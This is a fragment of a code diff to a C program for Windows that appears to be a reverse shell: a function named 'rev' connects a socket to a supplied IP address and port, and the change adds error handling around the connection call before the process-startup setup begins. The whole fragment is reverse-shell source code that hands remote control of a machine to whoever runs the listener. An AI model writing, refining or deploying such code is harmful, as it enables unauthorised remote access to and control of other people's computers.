@@ -14,7 +14,13 @@ void rev(char* ip)
 	hax.sin_port = htons(REV_PORT);
 	hax.sin_addr.s_addr = inet_addr(ip);
 
-	WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
+	if (WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL))
+	{
+#ifdef DEBUG
+		printf("WSAConnnect Failed");
+#endif
+		return;
+	}
 
 	memset(&si, 0, sizeof(si));
 	si.cb = sizeof(si);
